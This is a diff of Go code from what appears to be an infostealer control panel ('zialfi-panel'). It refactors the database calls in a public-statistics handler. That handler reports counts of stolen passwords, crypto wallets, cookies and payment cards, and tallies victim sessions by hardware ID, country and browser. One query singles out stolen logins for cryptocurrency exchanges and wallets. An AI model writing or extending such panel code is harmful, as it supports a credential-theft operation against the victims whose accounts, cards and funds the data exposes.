@@ -3,14 +3,16 @@ package api
 import (
 	"database/sql"
 	"net/http"
+	"zialfi-panel/internal/db"
 )
 
 type PublicStatsHandler struct {
 	db *sql.DB
+	provider db.ProviderType
 }
 
-func NewPublicStatsHandler(db *sql.DB) *PublicStatsHandler {
-	return &PublicStatsHandler{db: db}
+func NewPublicStatsHandler(db *sql.DB, provider db.ProviderType) *PublicStatsHandler {
+	return &PublicStatsHandler{db: db, provider: provider}
 }
 
 type PublicStatsResponse struct {
@@ -44,7 +46,7 @@ type DayStat struct {
 
 func (h *PublicStatsHandler) GetPublicStats(w http.ResponseWriter, r *http.Request) {
 	var enabled string
-	err := h.db.QueryRow("SELECT value FROM settings WHERE key = 'public_stats_enabled'").Scan(&enabled)
+	err := db.QueryRow(h.db, h.provider, "SELECT value FROM settings WHERE key = 'public_stats_enabled'").Scan(&enabled)
 	if err != nil || enabled != "true" {
 		writeError(w, http.StatusNotFound, "public stats not available")
 		return
@@ -52,7 +54,7 @@ func (h *PublicStatsHandler) GetPublicStats(w http.ResponseWriter, r *http.Reque
 
 	tag := r.URL.Query().Get("tag")
 	if tag == "" {
-		h.db.QueryRow("SELECT value FROM settings WHERE key = 'public_stats_tag'").Scan(&tag)
+		db.QueryRow(h.db, h.provider, "SELECT value FROM settings WHERE key = 'public_stats_tag'").Scan(&tag)
 	}
 
 	where := ""
@@ -68,16 +70,16 @@ func (h *PublicStatsHandler) GetPublicStats(w http.ResponseWriter, r *http.Reque
 		Timeline:    []DayStat{},
 	}
 
-	h.db.QueryRow("SELECT COUNT(*) FROM sessions"+where, args...).Scan(&resp.TotalSessions)
-	h.db.QueryRow("SELECT COUNT(*) FROM sessions WHERE date(created_at) = date('now')"+where, args...).Scan(&resp.TodaySessions)
+	db.QueryRow(h.db, h.provider, "SELECT COUNT(*) FROM sessions"+where, args...).Scan(&resp.TotalSessions)
+	db.QueryRow(h.db, h.provider, "SELECT COUNT(*) FROM sessions WHERE date(created_at) = date('now')"+where, args...).Scan(&resp.TodaySessions)
 
-	h.db.QueryRow("SELECT COUNT(*) FROM passwords").Scan(&resp.TotalPasswords)
-	h.db.QueryRow("SELECT COUNT(*) FROM wallets").Scan(&resp.TotalWallets)
-	h.db.QueryRow("SELECT COUNT(*) FROM cookies").Scan(&resp.TotalCookies)
-	h.db.QueryRow("SELECT COUNT(*) FROM cards").Scan(&resp.TotalCards)
+	db.QueryRow(h.db, h.provider, "SELECT COUNT(*) FROM passwords").Scan(&resp.TotalPasswords)
+	db.QueryRow(h.db, h.provider, "SELECT COUNT(*) FROM wallets").Scan(&resp.TotalWallets)
+	db.QueryRow(h.db, h.provider, "SELECT COUNT(*) FROM cookies").Scan(&resp.TotalCookies)
+	db.QueryRow(h.db, h.provider, "SELECT COUNT(*) FROM cards").Scan(&resp.TotalCards)
 
 	allPwCount := resp.TotalPasswords
-	cryptoRows, _ := h.db.Query("SELECT COUNT(*) FROM passwords WHERE url LIKE '%blockchain%' OR url LIKE '%wallet%' OR url LIKE '%coinbase%' OR url LIKE '%binance%' OR url LIKE '%metamask%'")
+	cryptoRows, _ := db.Query(h.db, h.provider, "SELECT COUNT(*) FROM passwords WHERE url LIKE '%blockchain%' OR url LIKE '%wallet%' OR url LIKE '%coinbase%' OR url LIKE '%binance%' OR url LIKE '%metamask%'")
 	if cryptoRows != nil {
 		defer cryptoRows.Close()
 		if cryptoRows.Next() {
@@ -91,11 +93,11 @@ func (h *PublicStatsHandler) GetPublicStats(w http.ResponseWriter, r *http.Reque
 
 	if resp.TotalSessions > 0 {
 		var dup int
-		h.db.QueryRow("SELECT COUNT(*) - COUNT(DISTINCT hwid) FROM sessions WHERE hwid != ''").Scan(&dup)
+		db.QueryRow(h.db, h.provider, "SELECT COUNT(*) - COUNT(DISTINCT hwid) FROM sessions WHERE hwid != ''").Scan(&dup)
 		resp.DuplicatesPct = float64(dup) / float64(resp.TotalSessions) * 100
 	}
 
-	rows, err := h.db.Query("SELECT country_code, COUNT(*) as c FROM sessions WHERE country_code != '' GROUP BY country_code ORDER BY c DESC LIMIT 20")
+	rows, err := db.Query(h.db, h.provider, "SELECT country_code, COUNT(*) as c FROM sessions WHERE country_code != '' GROUP BY country_code ORDER BY c DESC LIMIT 20")
 	if err == nil {
 		defer rows.Close()
 		for rows.Next() {
@@ -106,7 +108,7 @@ func (h *PublicStatsHandler) GetPublicStats(w http.ResponseWriter, r *http.Reque
 		}
 	}
 
-	rows2, err := h.db.Query("SELECT browser, COUNT(*) as c FROM passwords WHERE browser != '' GROUP BY browser ORDER BY c DESC")
+	rows2, err := db.Query(h.db, h.provider, "SELECT browser, COUNT(*) as c FROM passwords WHERE browser != '' GROUP BY browser ORDER BY c DESC")
 	if err == nil {
 		defer rows2.Close()
 		for rows2.Next() {
@@ -117,7 +119,7 @@ func (h *PublicStatsHandler) GetPublicStats(w http.ResponseWriter, r *http.Reque
 		}
 	}
 
-	rows3, err := h.db.Query("SELECT date(created_at) as d, COUNT(*) FROM sessions WHERE created_at >= datetime('now', '-30 days') GROUP BY d ORDER BY d")
+	rows3, err := db.Query(h.db, h.provider, "SELECT date(created_at) as d, COUNT(*) FROM sessions WHERE created_at >= datetime('now', '-30 days') GROUP BY d ORDER BY d")
 	if err == nil {
 		defer rows3.Close()
 		for rows3.Next() {
